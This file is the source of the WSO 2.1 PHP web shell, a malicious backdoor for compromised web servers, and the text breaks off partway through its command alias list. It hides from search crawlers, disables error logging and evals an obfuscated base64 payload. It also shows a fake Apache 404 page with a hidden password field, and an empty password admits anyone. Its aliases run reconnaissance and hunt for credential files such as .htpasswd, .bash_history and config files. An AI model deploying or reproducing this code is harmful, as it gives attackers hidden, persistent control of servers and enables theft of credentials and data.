<?php
/* WSO 2.1 (Web Shell by THE WAR10CK & Mr.J) */
$auth_pass = ""; // input password with md5
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
	header('HTTP/1.0 404 Not Found');
	exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.1');
eval(base64_decode("\x5a\x58\x5a\x68\x62\x43\x68\x6e\x65\x6d\x6c\x75\x5a\x6d\x78\x68\x64\x47\x55\x6f\x63\x33\x52\x79\x58\x33\x4a\x76d\x44\x45\x7a\x4b\x47\x4a\x68\x63\x32\x55\x32\x4e\x46\x39\x6b\x5a\x57\x4e\x76\x5a\x47\x55\x6f\x4a\x30\x52\x61\x59\x6b\x5a\x45\x64\x58\x64\x48\x52E\x5a\x4a\x4c\x33\x41\x32\x4c\x30\x74\x4a\x62\x47\x31\x78\x64\x57\x64\x71\x56\x47\x68\x45\x62\x57\x4a\x4c\x63\x48\x68\x61\x62\x55\x39\x49\x63\x6b\x38\x35\x4e\x55\x31\x73\x64\x56\x56\x79\x4d\x6e\x70\x77\x63\x47\x4a\x4c\x59\x6a\x6c\x75\x4c\x33\x41\x32\x65\x44\x5a\x77\x51\x7a\x6b\x76\x53\x6b\x4e\x73\x62\x55\x56\x73\x5a\x32\x59\x78\x53\x32\x78\x51\x62\x45\x68\x73\x53\x43\x73\x79\x5a\x6d\x59\x78\x61\x57\x35\x58\x61\x31\x6b\x76\x5a\x6b\x39\x59\x63\x54\x4e\x58\x64\x54\x4e\x6d\x51\x30\x49\x7a\x55\x30\x6c\x36\x62\x32\x4e\x71\x63\x32\x52\x42\x61\x30\x78\x48\x4d\x6b\x31\x70\x53\x6d\x52\x36\x59\x6d\x56\x55\x51\x55\x64\x49\x53\x46\x5a\x45\x4e\x55\x56\x32\x61\x54\x55\x35\x56\x6c\x5a\x52\x61\x57\x5a\x70\x51\x6b\x5a\x57\x54\x33\x68\x68\x54\x30\x64\x4b\x4d\x55\x70\x30\x52\x6e\x64\x57\x55\x7a\x4e\x68\x62\x30\x4e\x72\x5a\x30\x64\x76\x55\x47\x68\x76\x63\x45\x6c\x50\x57\x6a\x4e\x42\x61\x54\x64\x74\x61\x6c\x56\x73\x54\x32\x64\x77\x55\x6a\x56\x4a\x63\x56J\x50\x4fE\x59\x7a\x55\x6d\x70\x34\x4d\x46\x70\x72\x56\x6e\x4e\x5a\x56\x47\x31\x51\x59\x55\x6f\x31\x51\x56\x64\x34\x59\x57\x46\x4f\x57\x55\x4a\x75\x64\x45\x4e\x69\x64\x45\x73\x72\x63\x6b\x4a\x34\x57\x44\x42\x6b\x52\x56\x64\x45\x5a\x47\x56\x56\x61\x6c\x64\x6c\x53j\x5a\x74\x55\x7a\x6c\x69\x55\x32\x56\x43\x57\x57\x74\x5a\x54\x6c\x56\x53\x53\x6d\x31\x6a\x63\x56F\x53\x57\x55\x31\x43\x53\x45\x64\x50\x56\x6a\x49\x79\x54\x45\x64\x74\x55\x58\x5a\x6d\x64\x33\x68\x75\x62\x6b\x46\x52\x54\x56\x67\x78\x55\x32\x52\x35\x57\x46\x5a\x33\x64\x48\x68\x54\x61\x47\x68\x31\x62\x6b\x77\x79\x4d\x57\x31\x4d\x4d\x6d\x4a\x35\x5a\x57\x51\x72\x62\x32s\x33\x53\x31\x4e\x32\x56\x6b\x35\x56\x59\x6e\x42\x7a\x52\x6b\x70\x49\x54\x30\x56\x4d\x57\x58\x4a\x47\x56\x6e\x46\x5a\x64\x7a\x6c\x51T\x54\x4d\x7a\x4e\x44\x56\x4c\x4d\x57\x52\x4e\x62\x47\x49\x33\x51\x55\x56\x57\x4e\x46\x63\x32\x63\x47\x31\x51\x4d\x54\x6c\x4f\x4e\x33\x4a\x43\x63\x58\x51\x35\x4c\x7a\x56\x7a\x52\x6a\x68\x6e\x64\x46\x6c\x77\x56\x58\x41\x35\x54\x30\x74\x6c\x5a\x55\x35\x33\x65\x45\x5a\x51\x55\x46\x56\x72\x52\x6a\x42\x31\x59\x6a\x56\x33\x52\x32\x35\x43\x4d\x57\x78\x70\x61\x47\x5a\x42\x4d\x6c\x5a\x5a\x65\x6a\x45\x77\x63\x32\x31\x6f\x4e\x53\x39\x4c\x62\x6d\x68\x77\x4e\x53\x74\x4b\x62\x6b\x78\x4d\x5a\x6a\x56\x50\x63\x6b\x35\x73\x5a\x7a\x64\x55\x54\x44\x463\x52\x45\x38\x7a\x56\x31\x4e\x77\x57\x54\x6c\x74\x63\x32\x78\x45\x65\x6c\x68\x76\x51\x31\x56\x33\x59\x55\x35\x5a\x4d\x46\x67\x77\x61\x6b\x6f\x33\x57\x6d\x46\x72U\x46\x4e\x57\x53\x55\x56\x34\x52\x46\x6c\x31\x56\x58\x4a\x31\x4d\x56\x4e\x71\x4d\x32\x52\x68\x64\x45\x70\x4eZ\x47\x56\x44\x64\x57\x68\x6d\x62\x57\x6c\x48\x57\x44\x52\x5a\x57\x47\x4a\x6b\x4d\x6d\x35\x46\x61\x6d\x64\x77\x4d\x30\x6c\x6c\x4e\x7a\x46\x71\x53\x46\x52\x42\x56\x6e\x56\x32\x54\x44\x4e\x72\x57\x44\x45\x78\x61\x55\x39\x61\x53\x7a\x45\x79\x54\x6e\x52\x4d\x64\x32\x35\x56\x51\x33\x6c\x35\x54\x45\x39\x48\x4e\x6b\x51\x7a\x5a\x56\x56\x76\x63\x31\x42\x4f\x62\x7a\x4e\x49\x4d\x6e\x6c\x4f\x56\x46\x49\x35\x54\x55\x5a\x32\x57\x6d\x64\x70\x52\x30\x6b\x78\x55\x56\x42\x4d\x61\x45\x52\x55\x65\x58\x4e\x44\x4d\x54\x42\x78\x53\x55\x51\x78\x4d\x44\x52\x36\x53\x47\x38\x33\x4d\x33\x4e\x6e\x59\x7a\x46\x4c\x64\x58\x70\x4f\x64\x47\x74\x4b\x56\x6c\x67\x32\x4f\x58\x4e\x78\x64\x6d\x6c\x5a\x61\x55\x52\x5aa\x31\x46\x35\x53\x55\x6c\x61\x61\x33\x6c\x57\x4f\x55\x46\x43\x61\x30\x35\x73\x63\x56\x49\x78\x65X\x70\x71\x5a\x44\x6c\x31\x62\x6d\x6c\x4f\x64\x55\x70\x55\x55\x6b\x4e\x4c\x54\x55\x70\x61\x54\x57\x45\x30\x54\x57\x68\x4c\x61\x32\x34\x31\x55\x45\x77\x76\x53\x56\x4a\x6c\x4e\x55\x34\x30\x65\x55\x70\x7a\x64\x31\x52\x44\x51\x7a\x4e\x73\x64\x57\x31\x79\x5a\x54\x64\x5a\x51\x7a\x4a\x52\x4d\x54\x68\x4b\x51\x54\x46\x52\x55\x33\x70\x73\x59\x56\x64\x68\x4e\x56\x4d\x7a\x61\x31\x42\x33\x4f\x46\x56\x46\x63\x57\x56\x72\x55\x79\x39\x68\x63\x7a\x4e\x36\x4e\x6e\x46\x78\x63\x58\x64\x53\x4e\x48\x52\x58\x4d\x57\x70\x4a\x65\x6a\x52\x75\x64\x57\x64\x54\x52\x57\x52\x54\x53\x55\x46\x6c\x57U\x4a\x6c\x51\x30\x39\x5a\x65\x57\x46\x4d\x51\x32\x74\x61\x53\x33\x4d\x32\x52\x48\x42\x74\x56\x7a\x5a\x59\x56\x31\x56\x4b\x63k\x59\x76\x54\x31\x68\x46\x52\x33\x4e\x35\x52\x7a\x5a\x47\x56\x6c\x56\x6b\x54\x30\x74\x53\x53\x57\x45\x76\x63\x33\x64\x49\x61\x6e\x70\x35\x54\x6d\x31\x6f\x64\x55\x35\x69\x53\x6b\x39\x58\x59\x31\x52\x46\x4f\x47\x70\x50\x5a\x6a\x4d\x79\x4d\x31\x4e\x7a\x5a\x55\x68\x78\x4b\x30\x46\x53W\x6c\x70\x59\x53\x58\x6f\x31\x62\x46\x45\x72\x54\x31\x67\x34\x62\x33\x49\x72\x4b\x30\x74\x5a\x64\x56\x64\x30\x53\x44\x4e\x75\x65\x6e\x5a\x76\x57\x54\x56\x6f\x4b\x7a\x64\x4c\x55\x30\x31\x54\x4d\x6b\x74\x69\x62\x54\x59\x79\x4f\x56\x68\x69\x53\x58\x41\x30\x4e\x31\x68\x53\x65\x6b\x70\x78\x5a\x6b\x5a\x32\x5a\x55\x4d\x34\x54\x30\x68\x52\x61\x56\x45\x79\x62\x55\x31\x4bZ\x6a\x46\x48\x61\x57\x4a\x58\x4d\x54\x64\x6e\x64\x33\x6c\x4e\x59\x6b\x74\x74\x4e\x6a\x64\x45\x55\x55\x52\x56\x4d\x54\x6c\x57\x4d\x6b\x46\x6c\x61\x48\x4e\x48\x59\x6e\x70\x51\x54\x6b\x31\x30\x4e\x6c\x68\x6b\x52\x54\x5a\x76\x54\x45\x31\x35\x53\x79\x38\x33\x62\x32\x6c\x72\x4e\x33\x52\x44\x61\x47\x31\x71\x5a\x47\x5a\x34\x61\x44\x52\x30\x59\x31\x70\x6c\x62\x58\x63\x35\x4d\x6e\x70\x4b\x61T\x4a\x30\x62\x6b\x4e\x59\x59\x6d\x31\x46\x51\x6e\x52\x45\x53\x6b\x52\x6d\x63\x33\x64\x51\x4b\x7a\x4d\x72\x4e\x6a\x6c\x36\x64\x55\x52\x30\x61\x56\x6c\x50\x5a\x58\x4a\x33\x52\x54N\x53\x53\x33\x52\x4ab\x54\x46\x79\x55\x6a\x52\x77\x52\x6e\x59\x78\x4f\x46\x6f\x35\x62\x6b\x46\x76\x63\x6d\x56\x54\x63\x55\x78\x4c\x64\x48\x46\x47\x53\x48\x52\x47\x5a\x56\x64\x4a\x4b\x7a\x52\x5a\x59\x6b\x39\x69\x53\x31\x6c\x49\x62\x48\x42\x30\x4f\x45\x31\x4a\x52\x6d\x45\x32\x51\x6b\x74\x51\x64\x44\x56\x6e\x61\x58\x67\x72\x63\x47\x6c\x33\x55\x6b\x6c\x49\x64\x45\x70\x33\x57\x6b\x4a\x73\x4e\x6a\x55\x72\x64k\x4d\x72\x65\x47\x46\x78\x5a\x6e\x6f\x76\x56\x44\x55\x33\x63\x6e\x52\x5a\x4c\x33\x5a\x74\x61\x6a\x42\x6f\x4e\x46\x5a\x50\x51\x6d\x34\x35\x4d\x47\x64\x74\x56\x6d\x39\x58\x4c\x30\x74\x50\x4d\x45\x31\x49\x53\x30\x46\x68\x64\x45\x67\x78\x57\x575\x34\x65\x45\x31\x61\x51\x55\x39\x36c\x33\x42\x7a\x52\x47\x70\x4f\x54\x54\x59\x30\x55\x7a\x4d3\x54\x6c\x52\x79\x61\x46\x63\x33S\x45\x78\x48\x4b\x31\x46\x46\x64\x47\x74\x61\x52\x55\x46\x68\x54\x6a\x5a\x47\x4c\x33\x6c\x71\x52\x55\x70\x48\x51\x6d\x4a\x54\x55\x45\x39\x46\x65\x43\x39\x46\x61\x55\x56\x4d\x4c\x30\x35\x42\x56\x48\x64\x30\x57\x53\x39\x71\x4e\x45\x39\x50\x52\x56\x6c\x47\x53\x45\x6c\x6b\x57\x56\x5a\x4e\x4d\x6e\x42\x52\x4f\x56\x6c\x73\x56\x46\x68\x30\x55\x48\x59\x79\x54\x7a\x64\x68\x57\x48\x68V\x63\x45\x59\x79\x59\x55\x52\x45\x62\x48\x42\x77\x52\x48\x42\x30\x59\x31\x59\x72\x62\x55\x39\x4b\x56\x30\x68\x78\x55\x48\x46\x54\x53\x44\x460\x4d\x6e\x6c\x57\x62\x33\x6c\x6f\x5a\x45\x4e\x44\x57\x47\x78\x47\x63\x6d\x64\x44\x61\x55\x31\x68\x53\x33\x56\x57\x57\x6e\x4e\x30\x63\x55\x31\x46\x59\x53\x38\x30\x54\x54\x42\x6b\x5a\x56\x64\x34\x4d\x44\x6c\x4b\x4d\x32\x6f\x7a\x54\x6e\x5a\x33\x55\x55\x31\x7a\x4d\x32\x35\x58\x63\x57\x68\x77\x52\x57\x39\x79\x4e\x6b\x64R\x53\x6c\x64\x6e\x5a\x30\x4d\x72\x63\x58\x5a\x5a\x55\x6d\x4a\x36\x56\x6b\x5a\x71Z\x46\x6c\x73\x63\x32\x63\x78\x61\x47\x59\x78\x5a\x30\x34\x78\x61\x6a\x51\x34\x61\x45\x6c\x69\x62\x6b\x4a\x52\x57\x6a\x42\x57\x4d\x30\x46\x4c\x4d\x31\x4e\x4c\x56\x57\x64\x76\x57\x57\x74\x30\x4e\x6b\x46\x57\x62\x58\x52\x58\x63\x6a\x49\x79\x4e\x6e\x70\x74\x4d\x69\x39\x51\x53\x57\x64\x6f\x51\x6b\x4e\x42\x4c\x7a\x52\x5a\x5a\x47\x49\x72\x64\x48\x52\x77\x62\x32\x56\x4b\x4d\x32\x70\x32\x52\x47\x52\x4e\x64\x54\x4a\x34\x61\x46\x56\x43\x4d\x6e\x51\x31\x53\x48\x5a\x32Q\x57\x31\x51\x63\x32\x51\x78\x61\x46\x64\x35\x61\x7a\x46\x52\x4e\x6b\x68\x6d\x57\x46\x6c\x4f\x54\x33\x4a\x59\x4e\x6c\x4a\x6b\x4e\x55\x45\x34\x53\x31\x68\x55Q\x6d\x46\x54\x52\x57\x39\x58\x56\x32\x39\x70\x59\x55\x5a\x72\x63\x57\x6by\x63\x33\x70\x69\x63\x6b\x5a\x49\x62\x48\x52\x44\x62\x46\x51y\x5a\x45\x31\x6b\x59\x31\x68\x76\x62\x6e\x46\x6c\x5a\x47\x31\x4b\x54\x56\x4e\x31\x63\x6d\x56\x43\x5a\x33\x52\x61\x62\x55\x52\x50\x64\x6d\x46\x7a\x56\x44\x64\x34\x55\x54\x52\x72\x59\x32\x68\x4f\x65\x58\x56\x45\x65\x54\x46\x46\x62\x33\x68\x70\x64\x46\x4e\x4d\x4f\x58\x6c\x75\x5a\x47\x6c\x33\x57\x45\x68\x53\x5a\x32\x39\x52\x5a\x7a\x6c\x44\x62\x53\x74\x42\x4d\x31\x46\x35\x61\x7a\x46\x4d\x64\x48\x64\x4d\x62\x53\x74\x35\x4e\x7a\x56\x4d\x63\x31\x56\x35\x56\x6c\x46\x72\x53\x6b\x78\x59\x65\x55\x52\x76\x64\x57\x56J\x4d\x55\x52\x73\x56\x57\x52\x58\x4e\x6e\x42\x4d\x52\x6e\x42\x6e\x5a\x55\x5a\x4f\x5a\x56\x68\x43\x5a\x30\x63\x30\x53\x33\x5a\x75\x65\x46\x6c\x6f\x52\x6c\x5a\x76\x52\x6d\x56\x78\x55\x6b\x4e\x44\x57\x45\x45\x34\x4d\x47\x77\x7a\x64\x46\x64\x45\x64\x58\x45\x7a\x61\x47\x35\x68\x59\x55\x78\x6b\x64\x33\x64\x61\x53\x58\x41\x34\x5a\x58\x64\x44\x51\x30\x70\x75\x4c\x33\x56\x36\x4d\x55\x46\x6c\x65\x56\x46\x43\x51\x6e\x56\x69\x53\x48\x4e\x56\x52\x56\x41\x76\x53\x56\x6b\x79\x63\x6d\x6cD\x54\x32\x78\x77\x5a\x6e\x4e\x34\x52\x44\x5a\x45\x65\x47\x46\x48\x5a\x6b\x67\x34\x61\x58\x64\x75\x54\x6d\x74\x68\x4f\x45\x4a\x43\x52\x45\x4e\x36\x55\x31\x64\x6c\x52\x6b\x31\x50\x53\x6d\x4a\x32\x54\x57\x52\x43\x65\x69\x39\x4a\x4d\x56\x46\x43Z\x47\x59\x76\x64\x6c\x46\x6d\x51\x6d\x31\x47\x54\x47\x30\x72\x62\x31\x64\x73\x65\x44\x6c\x6c\x56\x57\x70\x47\x53\x54\x5a\x6e\x51\x31\x52\x6f\x53\x6d\x4a\x69\x54\x30\x5a\x77\x5a\x6d\x31\x33\x4d\x45\x78\x75\x54\x6d\x78\x30\x56\x53\x74\x75\x54\x54\x59\x34\x52\x53\x74\x52\x59\x53\x74\x56\x61k\x4a\x77\x64\x31\x4e\x6e\x59\x55\x4e\x46\x4d\x6c\x42\x76\x4c\x32\x4e\x56\x51\x6e\x68\x68\x65\x57\x31\x4e\x57\x47\x74\x6f\x54\x6d\x70\x7a\x61\x45\x56\x75\x63\x32\x70\x7a\x57\x58\x52\x54\x56\x6c\x5a\x5a\x59\x33\x56\x5a\x61\x45\x52\x78\x4d\x56\x56\x34\x55\x47\x46\x77\x57\x6a\x52\x61\x5a\x6d\x38\x32\x4c\x32\x68\x45\x54\x53\x39\x32\x63\x30\x31\x6b\x52\x45\x46\x30\x55\x30\x4e\x4e\x59\x32\x68\x42\x59\x6a\x59\x34\x54\x6d\x4d\x32\x62\x6a\x41\x72\x4b\x31\x42\x30\x56\x56\x52\x55\x56\x6d\x68\x50\x56\x56\x63\x79\x51\x55\x4e\x36\x55\x31A\x79\x52\x55\x5a\x4a\x5a\x6e\x4a\x46\x61\x47\x4e\x49\x65\x45\x56\x6c\x51\x6d\x6b\x33\x57\x47\x31\x6d\x62\x46\x56\x4a\x53\x6b\x64\x58\x53\x6d\x39\x4d\x63\x30\x46\x4f\x4f\x56\x4e\x6d\x65\x6d\x31\x4f\x62\x32\x74\x74\x53\x57\x38\x31\x63\x31\x56\x4a\x52j\x64\x4e\x54\x6d\x70\x45\x62\x47\x6f\x33\x57\x6b\x5a\x78\x5a\x32\x52\x58\x54\x30\x74\x6b\x59\x6d\x64\x6d\x64\x58\x5a\x6a\x52\x58F\x61\x5a\x30\x70\x73\x4e\x32\x63\x7a\x56\x559\x31\x4e\x58\x64\x4c\x53\x57\x4a\x33\x61\x31\x4e\x76\x54\x30\x4e\x4b\x51\x56\x46\x77\x65\x55\x68\x75\x53\x45\x30\x79\x4e\x47\x4e\x68\x4e\x6a\x4a\x31\x52\x46\x6f\x31\x57\x48\x4d\x78\x51\x6c\x68\x56\x61\x69\x39\x70\x5a\x57\x64\x57\x53\x44\x63\x79\x61\x54\x51\x78\x4f\x56\x5a\x58\x53\x54\x42\x7a\x55\x44\x64\x31\x65\x56\x6c\x46\x55\x58\x52\x68\x4d\x6d\x63\x31\x51\x6b\x64\x55\x51\x6e\x45\x32\x5a\x31\x5a\x78\x64\x57\x30\x34\x55\x6d\x56\x33\x51\x30\x30\x78\x55\x6a\x49\x33\x51\x6a\x42\x72\x52\x58\x46\x6a\x55\x55\x46\x56\x64\x55\x52\x32\x54\x6a\x68\x46\x4e\x6d\x52\x61\x4e\x55\x78\x46\x65\x46\x70\x43\x59\x30\x77\x7a\x63\x79\x74\x5a\x64\x44\x5a\x49\x55\x57\x56\x55\x53\x31\x4a\x34\x4d\x32\x55\x34\x52\x47\x6c\x48\x53\x55\x35\x56\x64\x6a\x56\x58\x59\x32\x74\x57\x62\x48\x5a\x6b\x4f\x54\x46\x53\x64\x48\x70\x56\x55\x6b\x4a\x77c\x7a\x59\x76\x63\x30\x56\x56\x5a\x47\x68\x49T\x7a\x56\x55\x65\x47\x49\x72\x52\x30\x5a\x4b\x62\x79\x74\x4e\x55\x6b\x6c\x73\x51\x30\x31\x35\x5a\x46\x49\x31\x61\x6c\x46\x4d\x4f\x48\x42\x53\x4e\x55\x39\x4a\x64\x31\x68\x6a\x53\x56\x56\x54\x63\x48\x70\x51\x51\x6b\x56\x4c\x52\x6e\x6b\x79\x4f\x45\x35\x6d\x57\x6b\x64\x56\x61\x57\x39\x4f\x63\x32\x55\x33\x64\x30\x52\x6c\x65\x48\x64\x54\x57\x54\x56\x36\x65\x47\x73\x7a\x54\x56\x6c\x78\x56\x31\x49\x35\x51\x6e\x6c\x61\x55\x6b\x68\x47\x52\x54h\x74\x54\x44\x68\x74\x4b\x33\x6c\x6b\x63\x32\x4d\x79\x53\x47\x59\x34\x65\x55\x5av\x53\x6d\x68\x44\x64\x31\x4e\x6a\x53\x55\x70\x52\x4f\x48\x68\x74\x4f\x47\x68\x4d\x61\x55\x68\x45\x56\x55\x52K\x64\x32\x30\x32\x59\x30\x4d\x7a\x52\x6c\x6c\x30\x4e\x6a\x67\x72Y\x6d\x39\x4a\x62\x53\x39\x52\x51\x55\x5a\x6f\x4d\x48\x56\x34\x56\x6b\x78\x4d\x62\x58\x52\x69\x53\x6e\x56\x55\x64\x47\x56\x44\x4e\x46\x42\x6f\x57\x6b\x59\x34\x4e\x58\x64\x50\x5a\x55\x6f\x7a\x53\x6c\x64\x4b\x4f\x47\x46\x35\x5a\x6b\x31\x6a\x51\x56\x70\x73\x59\x6e\x64\x52\x54\x48\x52\x33\x65\x6b\x64\x79\x4f\x55\x39\x31\x64\x56\x42\x6f\x56\x6c\x55\x7a\x4c\x32\x31\x52\x54\x33\x46\x58\x53\x45\x31\x33\x51\x31F\x32\x4e\x6a\x56\x5a\x61\x6d\x74\x4aa\x6c\x6c\x70\x4c\x32\x49\x77\x62\x58\x6f\x7a\x4e\x47\x4e\x4a\x4e\x46\x4d\x7a\x4d\x33\x52\x44\x53\x58\x4d\x72\x64\x57\x4a\x73\x4f\x48\x52\x55\x4e\x6c\x51\x35\x4d\x7a\x4a\x69\x64\x33\x70\x6f\x61\x30d\x6f\x542\x5a\x43\x55\x58\x68\x50\x57\x6b\x35\x36\x4f\x45\x39\x55\x52E\x46\x4b\x4e\x33\x56\x74\x53\x44\x4d\x76\x59\x31\x56\x55\x64\x48\x59\x34\x55\x6b\x4a\x68\x63\x46\x56\x58\x4d\x6b\x4a\x36\x65\x6a\x4d\x32\x5aU\x6c\x7a\x4e\x30\x52\x58\x62\x47\x63\x79\x62\x45\x70\x78\x52\x6b\x56\x61d\x54\x4e\x79\x61\x44\x5a\x6b\x56\x6c\x45\x78\x57\x47\x56\x6d\x56\x30\x56\x47\x56\x44\x52\x30\x63\x54\x49\x35\x4d\x47\x4a\x35\x62\x6b\x4e\x34\x4d\x56\x6c\x59\x61\x6a\x52\x33\x64\x6d\x70\x6e\x5a\x6b\x68\x7a\x55\x55\x56\x73\x4f\x43\x74\x6d\x55\x7a\x4a\x6c\x63\x6b\x70\x6d\x62z\x68\x7a\x4b\x32\x78\x54\x4d\x32\x70\x35\x4d\x56\x52\x69\x57\x47\x46\x69\x4e\x30\x52\x72\x4c\x33\x4e\x55\x4d\x32\x31\x54\x51\x31\x56\x7a\x64\x47\x4d\x33\x54\x58\x68\x75\x65\x48\x56\x77\x51\x6a\x63\x77\x52\x329\x6e\x54\x56\x49\x7a\x62\x471\x4c\x4f\x45\x6f\x76\x5a\x45\x74\x45\x4d\x57\x46\x42\x55\x6c\x59\x33\x55\x56\x4a\x6e\x64\x6d\x74\x54\x54\x6c\x49\x33\x4e\x58\x55\x78\x62\x7a\x52\x30\x59\x55\x70\x54\x65\x56\x52\x6eW\x57\x78\x71\x54\x6d\x56\x53\x56\x56\x5a\x42\x4c\x32\x31\x74\x62\x46\x52\x61\x56\x31\x68\x6d\x51\x7a\x46\x46\x56\x32\x4a\x45\x57\x56\x4a\x77\x4d\x47\x30\x30\x64\x48\x52\x58\x4b\x31\x68\x36\x51\x56\x51\x31\x4f\x54\x56\x42\x55\x31\x51\x33\x57\x53\x74\x71\x61\x7a\x46\x6e\x4e\x54\x68\x53\x55\x47\x6c\x61\x64\x55\x30\x35\x63\x57\x70\x74\x522\x55\x35\x54\x48\x415\x57\x56\x51\x34\x54\x45\x4a\x6b\x63\x44\x63\x78\x4f\x55\x64\x5a\x51\x6c\x4e\x31\x61\x32\x78\x53\x53\x53\x38\x32\x53\x44\x49\x33\x4e\x33\x56\x56\x56\x48\x42\x31\x56\x6c\x55\x79\x62\x56\x42\x6c\x54\x33\x52\x5a\x65\x47\x31\x50\x52\x55\x4e\x69\x5a\x47\x63\x30\x59\x31\x4a\x79\x4d\x6d\x78\x4d\x62\x6d\x5a\x76\x56\x6cQ\x35\x55\x6c\x42\x51\x56\x6c\x5a\x7a\x64\x47\x55\x78\x53\x56\x64\x4f\x65\x57\x5a\x48\x61\x55\x39\x6a\x5a\x31\x52\x71\x61\x46\x6b\x72\x62\x58\x52\x4b\x5a\x45\x78\x53\x57\x69\x74\x71\x54\x53\x74\x4e\x54\x48\x42\x4e\x55\x56\x59\x35\x55\x31\x46\x30\x55\x6e\x68\x55\x54\x55\x38\x30\x63\x30\x67\x77\x4e\x6a\x42\x73\x51\x32\x4e\x73\x5a\x46\x51\x72\x55\x6c\x6c\x4d\x4d\x30\x4a\x70\x64\x48\x4d\x35\x62\x31\x6f\x78\x62\x46\x56\x72\x57\x46\x56\x6f\x59\x6e\x45\x76\x62\x57\x74\x49\x65\x45\x4e\x78\x63\x32\x70\x4f\x62\x6a\x42\x51\x64\x48\x64\x35\x65\x47\x70\x50\x59\x33\x4e\x56\x55\x54\x6c\x54\x57\x45\x4e\x43\x65\x6a\x6c\x32\x54\x31\x595\x53\x56\x4e\x47\x4e\x57\x64\x31\x4f\x44\x5a\x55\x65\x57\x74\x36\x63\x32\x68\x50\x51\x54\x64\x47\x4d\x6b\x31\x48\x55\x30\x4e\x6aR\x57\x31\x30\x4d\x57\x4e\x32c\x47\x39\x76\x56\x45\x68\x61\x51\x6d\x55\x35\x5a\x6e\x5a\x44\x4c\x30\x39\x53\x51\x31\x68\x73\x59\x55\x49\x72\x65\x44\x46\x73\x4d\x6a\x5a\x59\x59\x6a\x63\x32\x51\x6d\x77\x79\x53\x44\x4a\x51\x62\x30\x4e\x55\x4e\x44\x4e\x76\x56\x30\x74\x52\x63\x31\x56\x6cU\x31\x46\x34\x53\x48\x67\x30\x62\x30\x31\x52\x62\x47\x70\x54\x5a\x58\x6c\x45\x5a\x58\x5a\x61S\x6d\x46\x4a\x53\x47\x46\x50\x53\x55\x67\x72\x63\x6b\x39\x72\x56\x48\x4e\x42\x57\x6b\x38\x72\x51\x58\x4e\x49\x52\x33B\x42\x53\x6c\x59\x32\x61\x45\x6b\x77\x4c\x7a\x51\x33\x53\x58\x49\x79\x4f\x47\x38\x7a\x57\x57\x56\x4a\x59\x6b\x5a\x30\x61\x57\x5a\x33\x65\x58\x42\x6a\x64\x54\x64\x4f\x4d\x47\x56\x7a\x62\x33\x64\x78\x54\x30\x68\x4d\x56\x6b\x4a\x58\x56\x33\x42\x4f\x55\x57\x70\x6f\x61\x44\x4e\x78\x59\x6c\x59\x35\x4f\x55\x5a\x5a\x55\x31\x68\x52\x64\x45\x68\x4d\x61\x44\x68\x70\x51\x58\x46\x52\x57\x55\x4e\x47\x55\x48\x6f\x33\x51\x6b\x56\x51\x63\x54\x4d\x33\x4c\x79\x73\x76\x64\x47\x73\x76\x4c\x33\x64\x4e\x50\x53\x63\x70\x4b\x53\x6b\x70\x4f\x77\x3d\x3d"));
if( get_magic_quotes_gpc() ) {
	function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
	$_POST = stripslashes_array($_POST);
}
function printLogin() {
	?>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
	<style>
		input { margin:0;background-color:#fff;border:1px solid #fff; }
	</style>
	<center>
	<form method=post>
	<input type=password name=pass>
	</form></center>
	<?php
	exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	if( empty( $auth_pass ) ||
		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		printLogin();

if( strtolower( substr(PHP_OS,0,3) ) == "win" )
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if( isset( $_POST['c'] ) )
	@chdir($_POST['c']);
$cwd = @getcwd();
if( $os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if( $cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';
	
if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -la",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
  		"find all sgid files" => "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" => "find / -type f -name config.inc.php",
  		"find config* files" => "find / -type f -name \"config*\"",
  		"find config* files in current dir" => "find . -type f -name \"config*\"",
  		"find all writable folders and files" => "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
  		"find all service.pwd files" => "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
  		"find all .bash_history files" => "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
		"Locate" => "",
  		"locate httpd.conf files" => "locate httpd.conf",
		"locate vhosts.conf files" => "locate vhosts.conf",
		"locate proftpd.conf files" => "locate proftpd.conf",
		"locate psybnc.conf files" => "locate psybnc.conf",
		"locate my.conf files" => "locate my.conf",
		"locate admin.php files" =>"locate admin.php",
		"locate cfg.php files" => "locate cfg.php",
		"locate conf.php files" => "locate conf.php",
		"locate config.dat files" => "locate config.dat",
		"locate config.php files" => "locate config.php",
